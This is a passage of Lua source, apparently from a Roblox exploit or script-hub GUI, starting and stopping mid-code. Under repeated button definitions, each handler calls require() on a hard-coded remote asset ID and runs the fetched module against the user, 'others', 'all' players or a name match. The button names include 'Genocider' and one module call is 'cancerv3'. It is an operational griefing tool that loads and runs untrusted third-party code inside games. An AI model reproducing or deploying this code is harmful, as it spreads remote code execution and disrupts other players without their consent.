		if memer == "me" then
			require(4666020750).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666020750).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666020750).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666020750).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel268.Name = "Vertical"
ImageLabel268.Parent = TextButton266
ImageLabel268.Position = UDim2.new(0, -2, 0, 0)
ImageLabel268.Size = UDim2.new(1, 3, 1, 0)
ImageLabel268.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel268.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel268.BackgroundTransparency = 1
ImageLabel268.ZIndex = 3
ImageLabel268.Image = "rbxassetid://3570695787"
ImageLabel268.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel268.ScaleType = Enum.ScaleType.Slice
ImageLabel268.SliceCenter = 100, 100, 100, 100
TextButton269.Name = "Admin"
TextButton269.Parent = ScrollingFrame100
TextButton269.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 188)
TextButton269.Size = UDim2.new(0, 271, 0, 21)
TextButton269.BackgroundColor = BrickColor.new("Really black")
TextButton269.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton269.BackgroundTransparency = 1
TextButton269.BorderColor = BrickColor.new("Really black")
TextButton269.BorderColor3 = Color3.new(0, 0, 0)
TextButton269.ZIndex = 7
TextButton269.Font = Enum.Font.SourceSansSemibold
TextButton269.FontSize = Enum.FontSize.Size14
TextButton269.Text = "Empyreus"
TextButton269.TextColor = BrickColor.new("Institutional white")
TextButton269.TextColor3 = Color3.new(1, 1, 1)
TextButton269.TextSize = 14
TextButton269.TextWrap = true
TextButton269.TextWrapped = true
TextButton269.TextXAlignment = Enum.TextXAlignment.Left
Script270.Parent = TextButton269
table.insert(cors,sandbox(Script270,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666053636).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666053636).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666053636).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666053636).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel271.Name = "Vertical"
ImageLabel271.Parent = TextButton269
ImageLabel271.Position = UDim2.new(0, -2, 0, 0)
ImageLabel271.Size = UDim2.new(1, 3, 1, 0)
ImageLabel271.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel271.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel271.BackgroundTransparency = 1
ImageLabel271.ZIndex = 3
ImageLabel271.Image = "rbxassetid://3570695787"
ImageLabel271.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel271.ScaleType = Enum.ScaleType.Slice
ImageLabel271.SliceCenter = 100, 100, 100, 100
TextButton272.Name = "Admin"
TextButton272.Parent = ScrollingFrame100
TextButton272.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 212)
TextButton272.Size = UDim2.new(0, 271, 0, 21)
TextButton272.BackgroundColor = BrickColor.new("Really black")
TextButton272.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton272.BackgroundTransparency = 1
TextButton272.BorderColor = BrickColor.new("Really black")
TextButton272.BorderColor3 = Color3.new(0, 0, 0)
TextButton272.ZIndex = 7
TextButton272.Font = Enum.Font.SourceSansSemibold
TextButton272.FontSize = Enum.FontSize.Size14
TextButton272.Text = "Ubergod"
TextButton272.TextColor = BrickColor.new("Institutional white")
TextButton272.TextColor3 = Color3.new(1, 1, 1)
TextButton272.TextSize = 14
TextButton272.TextWrap = true
TextButton272.TextWrapped = true
TextButton272.TextXAlignment = Enum.TextXAlignment.Left
Script273.Parent = TextButton272
table.insert(cors,sandbox(Script273,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666103936).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666103936).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666103936).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666103936).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel274.Name = "Vertical"
ImageLabel274.Parent = TextButton272
ImageLabel274.Position = UDim2.new(0, -2, 0, 0)
ImageLabel274.Size = UDim2.new(1, 3, 1, 0)
ImageLabel274.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel274.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel274.BackgroundTransparency = 1
ImageLabel274.ZIndex = 3
ImageLabel274.Image = "rbxassetid://3570695787"
ImageLabel274.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel274.ScaleType = Enum.ScaleType.Slice
ImageLabel274.SliceCenter = 100, 100, 100, 100
TextButton275.Name = "Admin"
TextButton275.Parent = ScrollingFrame100
TextButton275.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 236)
TextButton275.Size = UDim2.new(0, 271, 0, 21)
TextButton275.BackgroundColor = BrickColor.new("Really black")
TextButton275.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton275.BackgroundTransparency = 1
TextButton275.BorderColor = BrickColor.new("Really black")
TextButton275.BorderColor3 = Color3.new(0, 0, 0)
TextButton275.ZIndex = 7
TextButton275.Font = Enum.Font.SourceSansSemibold
TextButton275.FontSize = Enum.FontSize.Size14
TextButton275.Text = "Flamethrower"
TextButton275.TextColor = BrickColor.new("Institutional white")
TextButton275.TextColor3 = Color3.new(1, 1, 1)
TextButton275.TextSize = 14
TextButton275.TextWrap = true
TextButton275.TextWrapped = true
TextButton275.TextXAlignment = Enum.TextXAlignment.Left
Script276.Parent = TextButton275
table.insert(cors,sandbox(Script276,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666114735).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666114735).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666114735).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666114735).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel277.Name = "Vertical"
ImageLabel277.Parent = TextButton275
ImageLabel277.Position = UDim2.new(0, -2, 0, 0)
ImageLabel277.Size = UDim2.new(1, 3, 1, 0)
ImageLabel277.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel277.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel277.BackgroundTransparency = 1
ImageLabel277.ZIndex = 3
ImageLabel277.Image = "rbxassetid://3570695787"
ImageLabel277.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel277.ScaleType = Enum.ScaleType.Slice
ImageLabel277.SliceCenter = 100, 100, 100, 100
TextButton278.Name = "Admin"
TextButton278.Parent = ScrollingFrame100
TextButton278.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 260)
TextButton278.Size = UDim2.new(0, 271, 0, 21)
TextButton278.BackgroundColor = BrickColor.new("Really black")
TextButton278.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton278.BackgroundTransparency = 1
TextButton278.BorderColor = BrickColor.new("Really black")
TextButton278.BorderColor3 = Color3.new(0, 0, 0)
TextButton278.ZIndex = 7
TextButton278.Font = Enum.Font.SourceSansSemibold
TextButton278.FontSize = Enum.FontSize.Size14
TextButton278.Text = "Genocider"
TextButton278.TextColor = BrickColor.new("Institutional white")
TextButton278.TextColor3 = Color3.new(1, 1, 1)
TextButton278.TextSize = 14
TextButton278.TextWrap = true
TextButton278.TextWrapped = true
TextButton278.TextXAlignment = Enum.TextXAlignment.Left
Script279.Parent = TextButton278
table.insert(cors,sandbox(Script279,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666150028).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666150028).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666150028).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666150028).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel280.Name = "Vertical"
ImageLabel280.Parent = TextButton278
ImageLabel280.Position = UDim2.new(0, -2, 0, 0)
ImageLabel280.Size = UDim2.new(1, 3, 1, 0)
ImageLabel280.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel280.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel280.BackgroundTransparency = 1
ImageLabel280.ZIndex = 3
ImageLabel280.Image = "rbxassetid://3570695787"
ImageLabel280.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel280.ScaleType = Enum.ScaleType.Slice
ImageLabel280.SliceCenter = 100, 100, 100, 100
TextButton281.Name = "Admin"
TextButton281.Parent = ScrollingFrame100
TextButton281.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 284)
TextButton281.Size = UDim2.new(0, 271, 0, 21)
TextButton281.BackgroundColor = BrickColor.new("Really black")
TextButton281.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton281.BackgroundTransparency = 1
TextButton281.BorderColor = BrickColor.new("Really black")
TextButton281.BorderColor3 = Color3.new(0, 0, 0)
TextButton281.ZIndex = 7
TextButton281.Font = Enum.Font.SourceSansSemibold
TextButton281.FontSize = Enum.FontSize.Size14
TextButton281.Text = "GravHammer"
TextButton281.TextColor = BrickColor.new("Institutional white")
TextButton281.TextColor3 = Color3.new(1, 1, 1)
TextButton281.TextSize = 14
TextButton281.TextWrap = true
TextButton281.TextWrapped = true
TextButton281.TextXAlignment = Enum.TextXAlignment.Left
Script282.Parent = TextButton281
table.insert(cors,sandbox(Script282,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666268495).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666268495).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666268495).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666268495).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel283.Name = "Vertical"
ImageLabel283.Parent = TextButton281
ImageLabel283.Position = UDim2.new(0, -2, 0, 0)
ImageLabel283.Size = UDim2.new(1, 3, 1, 0)
ImageLabel283.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel283.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel283.BackgroundTransparency = 1
ImageLabel283.ZIndex = 3
ImageLabel283.Image = "rbxassetid://3570695787"
ImageLabel283.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel283.ScaleType = Enum.ScaleType.Slice
ImageLabel283.SliceCenter = 100, 100, 100, 100
TextButton284.Name = "Admin"
TextButton284.Parent = ScrollingFrame100
TextButton284.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 308)
TextButton284.Size = UDim2.new(0, 271, 0, 21)
TextButton284.BackgroundColor = BrickColor.new("Really black")
TextButton284.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton284.BackgroundTransparency = 1
TextButton284.BorderColor = BrickColor.new("Really black")
TextButton284.BorderColor3 = Color3.new(0, 0, 0)
TextButton284.ZIndex = 7
TextButton284.Font = Enum.Font.SourceSansSemibold
TextButton284.FontSize = Enum.FontSize.Size14
TextButton284.Text = "Lightning Emperor"
TextButton284.TextColor = BrickColor.new("Institutional white")
TextButton284.TextColor3 = Color3.new(1, 1, 1)
TextButton284.TextSize = 14
TextButton284.TextWrap = true
TextButton284.TextWrapped = true
TextButton284.TextXAlignment = Enum.TextXAlignment.Left
Script285.Parent = TextButton284
table.insert(cors,sandbox(Script285,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666285588).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666285588).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666285588).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666285588).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel286.Name = "Vertical"
ImageLabel286.Parent = TextButton284
ImageLabel286.Position = UDim2.new(0, -2, 0, 0)
ImageLabel286.Size = UDim2.new(1, 3, 1, 0)
ImageLabel286.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel286.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel286.BackgroundTransparency = 1
ImageLabel286.ZIndex = 3
ImageLabel286.Image = "rbxassetid://3570695787"
ImageLabel286.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel286.ScaleType = Enum.ScaleType.Slice
ImageLabel286.SliceCenter = 100, 100, 100, 100
TextButton287.Name = "Admin"
TextButton287.Parent = ScrollingFrame100
TextButton287.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 332)
TextButton287.Size = UDim2.new(0, 271, 0, 21)
TextButton287.BackgroundColor = BrickColor.new("Really black")
TextButton287.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton287.BackgroundTransparency = 1
TextButton287.BorderColor = BrickColor.new("Really black")
TextButton287.BorderColor3 = Color3.new(0, 0, 0)
TextButton287.ZIndex = 7
TextButton287.Font = Enum.Font.SourceSansSemibold
TextButton287.FontSize = Enum.FontSize.Size14
TextButton287.Text = "Trap Rifle"
TextButton287.TextColor = BrickColor.new("Institutional white")
TextButton287.TextColor3 = Color3.new(1, 1, 1)
TextButton287.TextSize = 14
TextButton287.TextWrap = true
TextButton287.TextWrapped = true
TextButton287.TextXAlignment = Enum.TextXAlignment.Left
Script288.Parent = TextButton287
table.insert(cors,sandbox(Script288,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666298879).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666298879).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666298879).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666298879).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel289.Name = "Vertical"
ImageLabel289.Parent = TextButton287
ImageLabel289.Position = UDim2.new(0, -2, 0, 0)
ImageLabel289.Size = UDim2.new(1, 3, 1, 0)
ImageLabel289.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel289.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel289.BackgroundTransparency = 1
ImageLabel289.ZIndex = 3
ImageLabel289.Image = "rbxassetid://3570695787"
ImageLabel289.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel289.ScaleType = Enum.ScaleType.Slice
ImageLabel289.SliceCenter = 100, 100, 100, 100
TextButton290.Name = "Admin"
TextButton290.Parent = ScrollingFrame100
TextButton290.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 356)
TextButton290.Size = UDim2.new(0, 271, 0, 21)
TextButton290.BackgroundColor = BrickColor.new("Really black")
TextButton290.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton290.BackgroundTransparency = 1
TextButton290.BorderColor = BrickColor.new("Really black")
TextButton290.BorderColor3 = Color3.new(0, 0, 0)
TextButton290.ZIndex = 7
TextButton290.Font = Enum.Font.SourceSansSemibold
TextButton290.FontSize = Enum.FontSize.Size14
TextButton290.Text = "Mr Bye Bye"
TextButton290.TextColor = BrickColor.new("Institutional white")
TextButton290.TextColor3 = Color3.new(1, 1, 1)
TextButton290.TextSize = 14
TextButton290.TextWrap = true
TextButton290.TextWrapped = true
TextButton290.TextXAlignment = Enum.TextXAlignment.Left
Script291.Parent = TextButton290
table.insert(cors,sandbox(Script291,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4620262474).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4620262474).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4620262474).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4620262474).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel292.Name = "Vertical"
ImageLabel292.Parent = TextButton290
ImageLabel292.Position = UDim2.new(0, -2, 0, 0)
ImageLabel292.Size = UDim2.new(1, 3, 1, 0)
ImageLabel292.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel292.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel292.BackgroundTransparency = 1
ImageLabel292.ZIndex = 3
ImageLabel292.Image = "rbxassetid://3570695787"
ImageLabel292.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel292.ScaleType = Enum.ScaleType.Slice
ImageLabel292.SliceCenter = 100, 100, 100, 100
TextButton293.Name = "Admin"
TextButton293.Parent = ScrollingFrame100
TextButton293.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 380)
TextButton293.Size = UDim2.new(0, 271, 0, 21)
TextButton293.BackgroundColor = BrickColor.new("Really black")
TextButton293.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton293.BackgroundTransparency = 1
TextButton293.BorderColor = BrickColor.new("Really black")
TextButton293.BorderColor3 = Color3.new(0, 0, 0)
TextButton293.ZIndex = 7
TextButton293.Font = Enum.Font.SourceSansSemibold
TextButton293.FontSize = Enum.FontSize.Size14
TextButton293.Text = "Zythian"
TextButton293.TextColor = BrickColor.new("Institutional white")
TextButton293.TextColor3 = Color3.new(1, 1, 1)
TextButton293.TextSize = 14
TextButton293.TextWrap = true
TextButton293.TextWrapped = true
TextButton293.TextXAlignment = Enum.TextXAlignment.Left
Script294.Parent = TextButton293
table.insert(cors,sandbox(Script294,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666351790).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666351790).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666351790).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666351790).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel295.Name = "Vertical"
ImageLabel295.Parent = TextButton293
ImageLabel295.Position = UDim2.new(0, -2, 0, 0)
ImageLabel295.Size = UDim2.new(1, 3, 1, 0)
ImageLabel295.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel295.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel295.BackgroundTransparency = 1
ImageLabel295.ZIndex = 3
ImageLabel295.Image = "rbxassetid://3570695787"
ImageLabel295.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel295.ScaleType = Enum.ScaleType.Slice
ImageLabel295.SliceCenter = 100, 100, 100, 100
TextButton296.Name = "Admin"
TextButton296.Parent = ScrollingFrame100
TextButton296.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 404)
TextButton296.Size = UDim2.new(0, 271, 0, 21)
TextButton296.BackgroundColor = BrickColor.new("Really black")
TextButton296.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton296.BackgroundTransparency = 1
TextButton296.BorderColor = BrickColor.new("Really black")
TextButton296.BorderColor3 = Color3.new(0, 0, 0)
TextButton296.ZIndex = 7
TextButton296.Font = Enum.Font.SourceSansSemibold
TextButton296.FontSize = Enum.FontSize.Size14
TextButton296.Text = "Spiderbot"
TextButton296.TextColor = BrickColor.new("Institutional white")
TextButton296.TextColor3 = Color3.new(1, 1, 1)
TextButton296.TextSize = 14
TextButton296.TextWrap = true
TextButton296.TextWrapped = true
TextButton296.TextXAlignment = Enum.TextXAlignment.Left
Script297.Parent = TextButton296
table.insert(cors,sandbox(Script297,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666386879).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666386879).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666386879).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666386879).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel298.Name = "Vertical"
ImageLabel298.Parent = TextButton296
ImageLabel298.Position = UDim2.new(0, -2, 0, 0)
ImageLabel298.Size = UDim2.new(1, 3, 1, 0)
ImageLabel298.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel298.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel298.BackgroundTransparency = 1
ImageLabel298.ZIndex = 3
ImageLabel298.Image = "rbxassetid://3570695787"
ImageLabel298.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel298.ScaleType = Enum.ScaleType.Slice
ImageLabel298.SliceCenter = 100, 100, 100, 100
TextButton299.Name = "Admin"
TextButton299.Parent = ScrollingFrame100
TextButton299.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 428)
TextButton299.Size = UDim2.new(0, 271, 0, 21)
TextButton299.BackgroundColor = BrickColor.new("Really black")
TextButton299.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton299.BackgroundTransparency = 1
TextButton299.BorderColor = BrickColor.new("Really black")
TextButton299.BorderColor3 = Color3.new(0, 0, 0)
TextButton299.ZIndex = 7
TextButton299.Font = Enum.Font.SourceSansSemibold
TextButton299.FontSize = Enum.FontSize.Size14
TextButton299.Text = "Switcher"
TextButton299.TextColor = BrickColor.new("Institutional white")
TextButton299.TextColor3 = Color3.new(1, 1, 1)
TextButton299.TextSize = 14
TextButton299.TextWrap = true
TextButton299.TextWrapped = true
TextButton299.TextXAlignment = Enum.TextXAlignment.Left
Script300.Parent = TextButton299
table.insert(cors,sandbox(Script300,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666430249).cancerv3(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666430249).cancerv3(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666430249).cancerv3(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666430249).cancerv3(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel301.Name = "Vertical"
ImageLabel301.Parent = TextButton299
ImageLabel301.Position = UDim2.new(0, -2, 0, 0)
ImageLabel301.Size = UDim2.new(1, 3, 1, 0)
ImageLabel301.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel301.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel301.BackgroundTransparency = 1
ImageLabel301.ZIndex = 3
ImageLabel301.Image = "rbxassetid://3570695787"
ImageLabel301.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel301.ScaleType = Enum.ScaleType.Slice
ImageLabel301.SliceCenter = 100, 100, 100, 100
TextButton302.Name = "Admin"
TextButton302.Parent = ScrollingFrame100
TextButton302.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -1012)
TextButton302.Size = UDim2.new(0, 271, 0, 21)
TextButton302.BackgroundColor = BrickColor.new("Really black")
TextButton302.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton302.BackgroundTransparency = 1
TextButton302.BorderColor = BrickColor.new("Really black")
TextButton302.BorderColor3 = Color3.new(0, 0, 0)
TextButton302.ZIndex = 7
TextButton302.Font = Enum.Font.SourceSansSemibold
TextButton302.FontSize = Enum.FontSize.Size14
TextButton302.Text = "Neptunian V                                                                       UPDATED"
TextButton302.TextColor = BrickColor.new("Institutional white")
TextButton302.TextColor3 = Color3.new(1, 1, 1)
TextButton302.TextSize = 14
TextButton302.TextWrap = true
TextButton302.TextWrapped = true
TextButton302.TextXAlignment = Enum.TextXAlignment.Left
Script303.Parent = TextButton302
table.insert(cors,sandbox(Script303,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661705712).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661705712).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
